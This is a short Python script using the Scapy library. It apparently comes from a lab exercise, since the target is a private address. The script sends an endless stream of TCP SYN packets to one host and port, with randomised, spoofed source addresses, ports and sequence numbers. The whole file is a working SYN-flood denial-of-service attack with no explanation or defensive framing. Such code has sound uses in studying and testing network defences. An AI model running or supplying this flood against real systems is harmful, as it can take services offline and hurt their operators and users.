from scapy.all import *
from random import getrandbits
from ipaddress import IPv4Address

ip=IP(dst="192.168.56.104")
tcp=TCP(dport=1919, flags='S')
pkt=ip/tcp

while True:
    pkt[IP] .src    =str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport  =getrandbits(16)
    pkt[TCP].seq    =getrandbits(32)
    send(pkt,verbose=0)
